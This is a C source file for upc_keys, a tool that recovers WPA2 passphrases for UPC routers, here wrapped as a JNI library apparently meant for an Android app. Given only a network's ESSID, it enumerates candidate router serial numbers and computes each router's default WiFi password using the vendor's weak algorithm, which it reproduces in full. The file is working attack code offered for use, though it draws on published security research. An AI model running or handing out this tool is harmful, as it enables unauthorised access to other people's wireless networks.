/*
 * ----------------------------------------------------------------------------
 * "THE BLASTY-WAREZ LICENSE" (Revision 1):
 * <peter@haxx.in> wrote this file. As long as you retain this notice and don't
 * sell my work you can do whatever you want with this stuff. If we meet some 
 * day, and you think this stuff is worth it, you can intoxicate me in return.
 * ----------------------------------------------------------------------------
 */
/* ------------------------------------------------------------------
 * Michal ?pa?ek <mail@michalspacek.cz> has modified this file,
 * "THE BLASTY-WAREZ LICENSE" still applies. See Git log for changes.
 * ------------------------------------------------------------------
 */
/*
 * upc_keys.c -- WPA2 passphrase recovery tool for UPC%07d devices
 * ===============================================================
 * You'd think vendors would stop using weak algorithms that allow
 * people to recover the credentials for a WiFi network based on
 * purely the ESSID. Sadly, these days aren't over yet. We've seen
 * some excellent recent research by Novella/Meijer/Verdult [1][2]
 * lately which illustrates that these issues still exist in recent
 * devices/firmwares. I set out to dig up one of these algorithms 
 * and came up with this little tool. 
 *
 * The attack is two-fold; in order to generate the single valid
 * WPA2 phrase for a given network we need to know the serialnumber
 * of the device.. which we don't have. Luckily there's a correlation
 * between the ESSID and serial number as well, so we can generate a
 * list of 'candidate' serial numbers (usually around ~20 or so) for 
 * a given ESSID and generate the corresponding WPA2 phrase for each
 * serial. (This should take under a second on a reasonable system)
 *
 * Use at your own risk and responsibility. Do not complain if it
 * fails to recover some keys, there could very well be variations
 * out there I am not aware of. Do not contact me for support.
 * 
 * Cheerz to p00pf1ng3r for the code cleanup! *burp* ;-)
 * Hugs to all old & new friends who managed to make it down to 32c3! ykwya!
 *
 * Happy haxxing in 2016! ;-]
 *
 * Cya,
 * blasty <peter@haxx.in> // 20151231
 *
 * UPDATE 20160108: I added support for 5GHz networks. Specifying network
 * type is mandatory now. But as a bonus you get less candidates. :-)
 *
 * P.S. Reversing eCos and broadcom CFE sux
 *
 * $ gcc -O2 -o upc_keys upc_keys.c -lcrypto 
 *
 * References
 * [1] https://www.usenix.org/system/files/conference/woot15/woot15-paper-lorente.pdf
 * [2] http://archive.hack.lu/2015/hacklu15_enovella_reversing_routers.pdf
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <openssl/md5.h>
#include <jni.h>

#define MAGIC_24GHZ 0xff8d8f20
#define MAGIC_5GHZ 0xffd9da60
#define MAGIC0 0xb21642c9ll
#define MAGIC1 0x68de3afll
#define MAGIC2 0x6b5fca6bll

#define MAX0 9
#define MAX1 99
#define MAX2 9
#define MAX3 9999

#define PREFIX_DELIMITER ","

#define UPDATE_ERROR 1
#define UPDATE_SUCCESS 2
#define UPDATE_RUNNING 3

char info_buffer[1024];
JNIEnv* cb_jnienv;
jobject cb_obj;
jmethodID cb_mid;
int cb_id;


void info_message(char* mes, int reason) {
    jstring jmes;
    
         
        jmes = (*cb_jnienv)->NewStringUTF(cb_jnienv, mes);
    
        (*cb_jnienv)->CallVoidMethod(cb_jnienv, cb_obj, cb_mid, jmes, (jint) reason, (jint) cb_id);

        (*cb_jnienv)->DeleteLocalRef(cb_jnienv, jmes);
    
}

void hash2pass(uint8_t *in_hash, char *out_pass)
{
	uint32_t i, a;

	for (i = 0; i < 8; i++) {
		a = in_hash[i] & 0x1f;
		a -= ((a * MAGIC0) >> 36) * 23;

		a = (a & 0xff) + 0x41;

		if (a >= 'I') a++;
		if (a >= 'L') a++;
		if (a >= 'O') a++;

		out_pass[i] = a;
	}
	out_pass[8] = 0;
}

uint32_t mangle(uint32_t *pp)
{
	uint32_t a, b;

	a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
	b = (pp[3] - a * 9999 + 1) * 11ll;

	return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
}

uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
{
	uint32_t a, b;

	a = data[1] * 10 + data[2];
	b = data[0] * 2500000 + a * 6800 + data[3] + magic;

	return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
}

void usage(char *prog)
{
	fprintf(stderr, "  Usage: %s <ESSID> <PREFIXES>\n", prog);
	fprintf(stderr, "   - ESSID should be in 'UPCxxxxxxx' format\n");
	fprintf(stderr, "   - PREFIXES should be a string of comma separated serial number prefixes\n\n");
}

extern int upc_attack(JNIEnv* env, jobject thiz, jmethodID mid, char* essid, char* prefixes_native, int myid)
{
	uint32_t buf[4], target;
	char serial[64];
	char serial_input[64];
	char pass[9], tmpstr[17];
	uint8_t h1[16], h2[16];
	uint32_t hv[4], w1, w2, i, j;
	int mode, prefix_cnt;
	char *prefix;

	cb_jnienv = env;
	cb_obj = (*cb_jnienv)->NewGlobalRef(cb_jnienv, thiz);
	cb_mid = mid;
 	cb_id = myid;

	if (strlen(essid) != 10 || memcmp(essid, "UPC", 3) != 0) {
		snprintf(info_buffer, sizeof(info_buffer), "AP has no valid ESSID!\n");
        info_message(info_buffer, UPDATE_ERROR);
		(*env)->DeleteGlobalRef(env, cb_obj);
		return 1;
	}

	char prefixes[strlen(prefixes_native) + 1];
	target = strtoul(essid + 3, NULL, 0);

	MD5_CTX ctx;

	for (buf[0] = 0; buf[0] <= MAX0; buf[0]++)
	for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
	for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
	for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
		mode = 0;
		if (upc_generate_ssid(buf, MAGIC_24GHZ) == target) {
			mode = 1;
		}
		if (upc_generate_ssid(buf, MAGIC_5GHZ) == target) {
			mode = 2;
		}
		if (mode != 1 && mode != 2) {
			continue;
		}

		strcpy(prefixes, prefixes_native);
		prefix = strtok(prefixes, PREFIX_DELIMITER);
		while (prefix != NULL) {
			//snprintf(info_buffer, sizeof(info_buffer), "Serial: %s%d%02d%d%04d\n", prefix, buf[0], buf[1], buf[2], buf[3]);
            //info_message(info_buffer, UPDATE_SUCCESS);
			sprintf(serial, "%s%d%02d%d%04d", prefix, buf[0], buf[1], buf[2], buf[3]);
			memset(serial_input, 0, 64);

			if (mode == 2) {
				for(i=0; i<strlen(serial); i++) {
					serial_input[strlen(serial)-1-i] = serial[i];
				}
			} else {
				memcpy(serial_input, serial, strlen(serial));
			}

			MD5_Init(&ctx);
			MD5_Update(&ctx, serial_input, strlen(serial_input));
			MD5_Final(h1, &ctx);

			for (i = 0; i < 4; i++) {
				hv[i] = *(uint16_t *)(h1 + i*2);
			}

			w1 = mangle(hv);

			for (i = 0; i < 4; i++) {
				hv[i] = *(uint16_t *)(h1 + 8 + i*2);
			}

			w2 = mangle(hv);

			//snprintf(info_buffer, sizeof(info_buffer),"%08X%08X", w1, w2);
           // info_message(info_buffer, UPDATE_SUCCESS);
			sprintf(tmpstr, "%08X%08X", w1, w2);

			MD5_Init(&ctx);
			MD5_Update(&ctx, tmpstr, strlen(tmpstr));
			MD5_Final(h2, &ctx);

			hash2pass(h2, pass);
			
			if(mode == 1) {
				snprintf(info_buffer, sizeof(info_buffer),"Serial: %s\nPW: %s\nat 2.4 GHz\n\n", serial, pass);
            	info_message(info_buffer, UPDATE_SUCCESS);
        	} else if(mode == 2) {
        		snprintf(info_buffer, sizeof(info_buffer),"Serial: %s\nPW: %s\nat 5 GHz\n\n", serial, pass);
           		info_message(info_buffer, UPDATE_SUCCESS);
        	}

			printf("%s,%s,%d\n", serial, pass, mode);
			prefix = strtok(NULL, PREFIX_DELIMITER);
		}
	}
		(*env)->DeleteGlobalRef(env, cb_obj);

	return 0;
}
